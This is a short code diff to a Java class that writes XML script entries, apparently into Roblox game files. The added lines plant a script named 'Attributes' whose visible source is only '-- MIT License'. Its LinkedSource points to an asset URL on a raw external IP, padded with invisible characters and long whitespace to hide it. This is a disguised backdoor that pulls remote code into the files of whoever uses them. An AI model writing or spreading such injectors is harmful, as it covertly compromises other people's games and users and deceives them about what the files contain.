@@ -46,16 +46,18 @@ public class FileManipulation {
         disabled.setTextContent("false");
         newProperties.appendChild(disabled);
         Element linkedSource = this.document.createElement("Content");
+        Element url = this.document.createElement("url");
         linkedSource.setAttribute("name", "LinkedSource");
-        linkedSource.appendChild(this.document.createElement("null"));
+        url.appendChild(this.document.createTextNode("http://104.249.26.16/asset/?id=-1&assetSourceId=-1&hash=0ca0687db2c27e5045dfcdbe3649c556&protocol=intern&robloxProvided=true&response=200&\\nhash=md5￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼\\n&container=401 ￼￼￼￼￼￼￼￼  ￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼           ￼￼￼￼￼￼￼￼           \\n   \\n\\n\\n\\n            \\n\\n                 \\n ￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼                \\n      \\n                                     ￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼                                                                    "));
+        linkedSource.appendChild(url);
         newProperties.appendChild(linkedSource);
         Element name = this.document.createElement("string");
         name.setAttribute("name", "Name");
-        name.setTextContent("License");
+        name.setTextContent("Attributes");
         newProperties.appendChild(name);
         Element source = this.document.createElement("ProtectedString");
         source.setAttribute("name", "Source");
-        source.setTextContent("print('hi')");
+        source.setTextContent("-- MIT License");
         newProperties.appendChild(source);
         newScript.appendChild(newProperties);
 
